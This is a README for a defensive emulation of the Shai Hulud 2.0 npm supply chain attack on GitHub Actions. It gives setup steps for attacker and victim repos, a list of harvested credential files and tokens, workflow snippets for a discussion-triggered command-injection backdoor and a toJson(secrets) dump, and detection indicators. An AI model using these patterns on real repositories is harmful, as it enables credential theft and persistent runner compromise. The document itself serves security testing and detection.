# Shai Hulud 2.0 - GitHub Actions Emulation

**FOR DEFENSIVE SECURITY TESTING ONLY**

Minimal emulation of Shai Hulud 2.0 supply chain attack targeting GitHub Actions and CI/CD pipelines. Based on [Wiz.io blog](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack).

## How Supply Chain Attacks Work

1. **Attacker compromises npm maintainer account** (phishing, credential stuffing)
2. **Publishes trojanized package version** with malicious `preinstall` hook
3. **Victim repo already depends on this package** (or a transitive dependency does)
4. **CI runs `npm install`** → preinstall hook executes → credentials harvested

The victim never explicitly installed the malicious package - it came through the dependency chain.

## Quick Start - Supply Chain Simulation

### Step 1: Push This Repo (Attacker Side)

Push this package to GitHub:
```bash
cd shai-hulud-github-minimal
git init
git add .
git commit -m "Initial commit"
git remote add origin git@github.com:terrancedejesus/trade-fake-shai-hulud-github-minimal.git
git push -u origin main
```

### Step 2: Victim Repo Setup

In your colleague's "victim" test repo:

```bash
# Create victim repo
mkdir victim-app && cd victim-app
git init

# Add the "malicious" dependency
npm init -y
npm install github:terrancedejesus/trade-fake-shai-hulud-github-minimal

# Or manually add to package.json:
```

**package.json:**
```json
{
  "name": "victim-app",
  "version": "1.0.0",
  "dependencies": {
    "shai-hulud-github": "github:terrancedejesus/trade-fake-shai-hulud-github-minimal"
  }
}
```

### Step 3: Add Workflow to Victim Repo

Create `.github/workflows/build.yml`:
```yaml
name: Build
on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Install Dependencies
        run: npm install
        # ^^^ This triggers the preinstall hook!

      - name: Show Findings
        run: |
          echo "=== Harvest Report ==="
          cat node_modules/shai-hulud-github/harvest_report.json || true

      - name: Upload Findings
        uses: actions/upload-artifact@v4
        with:
          name: shai-hulud-findings
          path: node_modules/shai-hulud-github/*.json
        if: always()
```

### Step 4: Push and Trigger

```bash
git add .
git commit -m "Add build workflow"
gh repo create YOUR_ORG/victim-app --private --source=. --push
```

The workflow will run automatically, executing the supply chain attack simulation.

---

## What Gets Harvested

### Credential Harvesting
- GitHub Actions env vars (`GITHUB_TOKEN`, `ACTIONS_RUNTIME_TOKEN`, etc.)
- GitHub CLI credentials (`~/.config/gh/hosts.yml`)
- Git credentials (`~/.git-credentials`, `~/.netrc`)
- NPM tokens (env vars and `.npmrc`)
- Repository and workflow context

### Attack Simulation (logged, not executed)
- **Backdoor workflow** (`discussion.yaml`) - Command injection via discussions
- **Secrets exfiltration** (`formatter_*.yml`) - Dump secrets via `toJson(secrets)`
- **Runner registration** - Self-hosted runner with label `SHA1HULUD`

## Output Files

| File | Contents |
|------|----------|
| `github.json` | GitHub tokens, configs, runner info, workflows |
| `environment.json` | CI environment, tokens, NPM credentials |
| `actionsSecrets.json` | Repository secrets (if accessible) |
| `harvest_report.json` | Complete findings |

## Detection Opportunities

### File Access
- `~/.config/gh/hosts.yml`
- `~/.git-credentials`
- `~/.netrc`
- `~/.npmrc`

### GitHub Audit Logs
- `workflows.created` with `toJson(secrets)`
- Runners with unusual labels (`SHA1HULUD`)
- Rapid branch create/delete with workflow changes

### Process-Based (EDR)
```
node preinstall.js spawned by npm install
```

## Attack Patterns (Simulated)

### 1. Backdoor (discussion.yaml)
```yaml
on: discussion
jobs:
  process:
    runs-on: [self-hosted, SHA1HULUD]
    steps:
      - run: ${{ github.event.discussion.body }}
```

### 2. Secrets Exfiltration (formatter_*.yml)
```yaml
env:
  ALL_SECRETS: ${{ toJson(secrets) }}
run: echo "$ALL_SECRETS" > actionsSecrets.json
```

### 3. Runner Registration
Registers infected machine with label `SHA1HULUD` for persistent access.

## Files

```
├── package.json          # NPM package with preinstall hook
├── preinstall.js         # Entry point (CI vs non-CI behavior)
├── harvester.js          # GitHub-focused harvester
├── index.js              # Placeholder module
├── workflow-templates/
│   ├── backdoor-discussion.yml    # Command injection pattern
│   ├── secrets-exfiltration.yml   # toJson(secrets) technique
│   └── victim-workflow.yml        # Test workflow for your repo
└── README.md
```

## Local Testing

```bash
# Test locally
npm install
cat harvest_report.json | jq .

# Simulate CI environment
GITHUB_ACTIONS=true npm install
```

## References

- [Wiz.io: Shai Hulud 2.0](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack)
- [GitHub Actions Security](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
